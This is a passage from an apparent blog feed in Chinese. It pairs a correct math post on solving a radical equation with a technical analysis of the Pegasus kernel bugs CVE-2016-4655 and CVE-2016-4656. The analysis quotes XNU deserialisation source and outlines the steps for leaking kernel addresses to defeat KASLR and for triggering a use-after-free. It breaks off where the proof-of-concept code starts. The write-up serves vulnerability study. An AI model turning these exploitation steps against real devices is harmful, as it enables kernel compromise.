    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/</id>
    <published>2017-05-04T12:37:59.000Z</published>
    <updated>2017-05-04T15:09:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 突然在邮件中收到Quora中这样一个问题”What does X equal in $\sqrt{x+15} + \sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。</p></blockquote><h2 id="0x01-你会怎么解决？"><a href="#0x01-你会怎么解决？" class="headerlink" title="0x01 你会怎么解决？"></a>0x01 你会怎么解决？</h2><p>不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。</p><h2 id="0x02-方法1-平方法"><a href="#0x02-方法1-平方法" class="headerlink" title="0x02 方法1 平方法"></a>0x02 方法1 平方法</h2><p>通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根</p><p>$\sqrt{x+15} + \sqrt{x} = 15$ </p><p>$(\sqrt{x+15} + \sqrt{x})^2 = 15^2$ </p><p>$x+15 + 2\sqrt{(x+15)x} + x = 225$ </p><p>$2\sqrt{(x+15)x} = 210 - 2x$  </p><p>$\sqrt{(x+15)x} = 105 - x$  </p><p>$(\sqrt{(x+15)x})^2 = (105 - x)^2$  </p><p>$x^2 + 15x = 11025 - 210x +x^2$  </p><p>$225x = 11025$  </p><p>$ x = 49$<br>思维过程很清楚，但明显计算上有点繁琐。  </p><h2 id="0x03-方法2-拼凑法"><a href="#0x03-方法2-拼凑法" class="headerlink" title="0x03 方法2 拼凑法"></a>0x03 方法2 拼凑法</h2><p>不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$）</p><p>哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。  </p><p>$\sqrt{49 + 15} + \sqrt{49} = 15$  </p><p>$7 + 8 = 15$<br>最快，但不一定可靠。</p><h2 id="0x04-方法3-平方差法"><a href="#0x04-方法3-平方差法" class="headerlink" title="0x04 方法3 平方差法"></a>0x04 方法3 平方差法</h2><p>暂且称作平方差法吧，这个方法是我最推荐的，既快又准。<br>原式：$\sqrt{x+15} + \sqrt{x} = 15$  (1)</p><p>设 $\sqrt{x+15} - \sqrt{x} = k$  </p><p>又 $(\sqrt{x+15} - \sqrt{x})(\sqrt{x+15} + \sqrt{x})= 15k$ </p><p>解得： $k = 1$    </p><p>所以 $\sqrt{x+15} - \sqrt{x} = 1$ （2）</p><p>然后<code>（1）+ (2)</code>:   $2\sqrt{x+15} = 16$  </p><p>解得: $x = 49$  </p><p>多么棒的一个方法 I love it！  </p><h2 id="0x05-我与数学"><a href="#0x05-我与数学" class="headerlink" title="0x05 我与数学"></a>0x05 我与数学</h2><p>从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步<a href="https://www.zhihu.com/question/30050677" target="_blank" rel="external">高考数学数列放缩总结技巧有哪些？</a><br>相信不管是现在还是将来，数学都是我最深处的支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 突然在邮件中收到Quora中这样一个问题”What do
      
    
    </summary>
    
      <category term="关于数学" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E5%85%B3%E4%BA%8E%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="数学" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Pegasus内核漏洞及PoC分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/</id>
    <published>2017-05-01T06:52:45.000Z</published>
    <updated>2017-05-02T14:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X<br> 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google<br> 1.<a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a><br> 2.<a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC</a><br> 3.<a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析</a></p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><ol><li><code>OSUnserializeBinary</code>概述</li><li>漏洞分析-CVE-2016-4655，CVE-2016-4656</li><li>漏洞利用-PoC分析</li><li>总结</li></ol><h2 id="0x02-OSUnserializeBinary概述"><a href="#0x02-OSUnserializeBinary概述" class="headerlink" title="0x02 OSUnserializeBinary概述"></a>0x02 <code>OSUnserializeBinary</code>概述</h2><ol><li><p>序列化与反序列化<br>在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。<br>在XNU内核也有一个实现，<code>OSUnserializeXML</code>(将xml格式转化为内核数据对象)和<code>OSUnserializeBinary</code>(将二进制格式转化为内核数据对象)</p></li><li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> kOSSerializeBinarySignature <span class="meta-string">"\323\0\0"</span> <span class="comment">/* 0x000000d3 */</span></span></div><div class="line"></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">    kOSSerializeDictionary      = <span class="number">0x01000000</span>U,</div><div class="line">    kOSSerializeArray           = <span class="number">0x02000000</span>U,</div><div class="line">    kOSSerializeSet             = <span class="number">0x03000000</span>U,</div><div class="line">    kOSSerializeNumber          = <span class="number">0x04000000</span>U,</div><div class="line">    kOSSerializeSymbol          = <span class="number">0x08000000</span>U,</div><div class="line">    kOSSerializeString          = <span class="number">0x09000000</span>U,</div><div class="line">    kOSSerializeData            = <span class="number">0x0a000000</span>U,</div><div class="line">    kOSSerializeBoolean         = <span class="number">0x0b000000</span>U,</div><div class="line">    kOSSerializeObject          = <span class="number">0x0c000000</span>U,</div><div class="line"></div><div class="line">    kOSSerializeTypeMask        = <span class="number">0x7F000000</span>U,</div><div class="line">    kOSSerializeDataMask        = <span class="number">0x00FFFFFF</span>U,</div><div class="line"></div><div class="line">    kOSSerializeEndCollection   = <span class="number">0x80000000</span>U,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p><table><thead><tr><th>当前集合是否结束</th><th>当前数据类型</th><th>当前元素长度</th></tr></thead><tbody><tr><td>0</td><td>0000000</td><td>000000000000000000000000</td></tr></tbody></table><p>例如下面的二进制数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x000000d3</span> <span class="number">0x81000000</span> <span class="number">0x09000004</span> <span class="number">0x41414141</span> <span class="number">0x8b000001</span></div></pre></td></tr></table></figure><p>则对应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;string&gt;AAAA&lt;/string&gt;  //键key</div><div class="line">    &lt;boolean&gt;1&lt;/boolean&gt;  //值value</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure><p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p><ol><li><code>OSUnserializeBinary()</code>分析<br>完整源代码见文末，下面将对其中几个重要的地方分别做分析说明  </li></ol><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (ok)</div><div class="line">&#123;</div><div class="line">    bufferPos += sizeof(*next);</div><div class="line">    <span class="keyword">if</span> (!(ok = (bufferPos &lt;= bufferSize))) <span class="keyword">break</span>;</div><div class="line">    key = *next++;</div><div class="line"></div><div class="line">    len = (key &amp; kOSSerializeDataMask);</div><div class="line">    wordLen = (len + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>;</div><div class="line">    end = (<span class="number">0</span> != (kOSSerializeEndCollecton &amp; key));</div><div class="line"></div><div class="line">    newCollect = isRef = <span class="literal">false</span>;</div><div class="line">    o = <span class="number">0</span>; newDict = <span class="number">0</span>; newArray = <span class="number">0</span>; newSet = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">switch</span> (kOSSerializeTypeMask &amp; key)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeDictionary:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeArray:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeSet:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeObject:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeNumber:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeSymbol:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeString:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeData:</span></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">kOSSerializeBoolean:</span></div><div class="line">        ...</div><div class="line"><span class="symbol"></span></div><div class="line">        default:</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure><p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> kOSSerializeDictionary:<span class="type"></span></div><div class="line">    o = <span class="keyword">new</span><span class="type">Dict</span> = OSDictionary:<span class="type"></span>:withCapacity(len);</div><div class="line">    <span class="keyword">new</span><span class="type">Collect</span> = (len != <span class="number">0</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure><p>o为指向当前反序列化对象的指针，在每种case中被指定  </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="symbol">kOSSerializeData:</span></div><div class="line">    bufferPos += (wordLen * <span class="keyword">sizeof</span>(uint32_t));</div><div class="line">    <span class="keyword">if</span> (bufferPos &gt; bufferSize) <span class="keyword">break</span>;</div><div class="line">    o = <span class="symbol">OSData:</span>:withBytes(<span class="keyword">next</span>, len);</div><div class="line">    <span class="keyword">next</span> += wordLen;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure><p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!(<span class="name">ok</span> = (<span class="name">o</span> != <span class="number">0</span>))) break<span class="comment">;</span></div></pre></td></tr></table></figure><p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!isRef)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">set</span>AtIndex(objs, objsIdx, o);</div><div class="line">    <span class="keyword">if</span> (!ok) <span class="built_in">break</span>;</div><div class="line">    objsIdx++;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> kOSSerializeObject:</div><div class="line"><span class="keyword">if</span> (<span class="built_in">len</span> &gt;= objsIdx) <span class="keyword">break</span>;</div><div class="line">o = objsArray[<span class="built_in">len</span>];</div><div class="line">o-&gt;retain();</div><div class="line">isRef = <span class="literal">true</span>;</div><div class="line"><span class="keyword">break</span>;</div></pre></td></tr></table></figure><p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#define setAtIndex(v, idx, o)                                                           \</div><div class="line">    if (idx &gt;= v##Capacity)                                                        \</div><div class="line">    &#123;                                                                                   \</div><div class="line">        uint32_t ncap = v##Capacity + 64;                                               \</div><div class="line">        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \</div><div class="line">        if (!nbuf) ok = false;                                                          \</div><div class="line">        if (v##Array)                                                                   \</div><div class="line">        &#123;                                                                               \</div><div class="line">            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \</div><div class="line">            kfree(v##Array, v##Capacity * sizeof(o));                                   \</div><div class="line">        &#125;                                                                               \</div><div class="line">        v##Array    = nbuf;                                                             \</div><div class="line">        v##Capacity = ncap;                                                             \</div><div class="line">    &#125;                                                                                   \</div><div class="line">    if (ok) v##Array[idx] = o;</div></pre></td></tr></table></figure><p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (dict)</div><div class="line">&#123;</div><div class="line">        <span class="keyword">if</span> (sym)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (o != dict) ok = dict-&gt;setObject(sym, o, <span class="literal">true</span>);</div><div class="line">            o-&gt;release();</div><div class="line">            sym-&gt;release();</div><div class="line">            sym = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            sym = OSDynamicCast(OSSymbol, o);</div><div class="line">            <span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</div><div class="line">            &#123;</div><div class="line">                sym = (OSSymbol *) OSSymbol::withString(str);</div><div class="line">                o-&gt;release();</div><div class="line">                o = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            ok = (sym != <span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>)</div><div class="line">    &#123;</div><div class="line">        ok = <span class="built_in">array</span>-&gt;setObject(o);</div><div class="line">        o-&gt;release();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</div><div class="line">    &#123;</div><div class="line">        ok = <span class="built_in">set</span>-&gt;setObject(o);</div><div class="line">       o-&gt;release();</div><div class="line">   &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        assert(!parent);</div><div class="line">        result = o;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">if (newCollect)</div><div class="line">&#123;</div><div class="line"><span class="built_in">if </span>(!end)</div><div class="line">&#123;</div><div class="line">stackIdx++;</div><div class="line">setAtIndex(stack, stackIdx, parent);</div><div class="line"><span class="built_in">if </span>(!ok) break;</div><div class="line">&#125;</div><div class="line">DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</div><div class="line">parent = o;</div><div class="line">dict   = newDict;</div><div class="line"><span class="built_in">array </span> = newArray;</div><div class="line">set    = newSet;</div><div class="line">end    = false;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">if </span>(end)</div><div class="line">&#123;</div><div class="line"><span class="built_in">if </span>(!stackIdx) break;</div><div class="line">parent = stackArray[stackIdx];</div><div class="line">DEBG(<span class="string">"--stack[%d] %p\n"</span>, stackIdx, parent);</div><div class="line">stackIdx--;</div><div class="line">set   = 0; </div><div class="line">dict  = 0; </div><div class="line"><span class="built_in">array </span>= 0;</div><div class="line"><span class="built_in">if </span>(!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">&#123;</div><div class="line"><span class="built_in">if </span>(!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p><h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p><h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p><p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case内容</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> kOSSerializeNumber:</div><div class="line">    bufferPos += sizeof(<span class="keyword">long</span> <span class="keyword">long</span>);</div><div class="line">    <span class="keyword">if</span> (bufferPos &gt; bufferSize) <span class="keyword">break</span>;</div><div class="line">    value = <span class="keyword">next</span>[<span class="number">1</span>];</div><div class="line">    value &lt;&lt;= <span class="number">32</span>;</div><div class="line">    value |= <span class="keyword">next</span>[<span class="number">0</span>];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    <span class="keyword">next</span> += <span class="number">2</span>;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p><h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>，见下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (dict)</div><div class="line">&#123;</div><div class="line">        <span class="keyword">if</span> (sym)</div><div class="line">        &#123;</div><div class="line">            ...</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            sym = OSDynamicCast(OSSymbol, o);</div><div class="line">            <span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</div><div class="line">            &#123;</div><div class="line">                sym = (OSSymbol *) OSSymbol::withString(str);</div><div class="line">                o-&gt;release();</div><div class="line">                o = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            ok = (sym != <span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>这里<code>o-&gt;release()</code>有什么问题呢?还记得<code>objsArray</code>吧，用来存储所有的对象，但是用<code>setAtIndex</code>这个宏来将所有的对象<code>o</code>存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面<code>kOSSerializeObject</code>中的<code>switchcase</code>。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> kOSSerializeObject:</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">len</span> &gt;= objsIdx) <span class="keyword">break</span>;</div><div class="line">    o = objsArray[<span class="built_in">len</span>];</div><div class="line">    o-&gt;retain();</div><div class="line">    isRef = <span class="literal">true</span>;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p><h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p><h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p><ul><li>构造一个包含过长的<code>OSNumber</code>dic字典</li><li>用这个序列化字典去设置userclient对象的属性</li><li>读回设置的<code>OSNumber</code>属性，造成infoleak</li><li>利用读取回来的内核地址信息计算KASLR    </li></ul><p>完整的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div 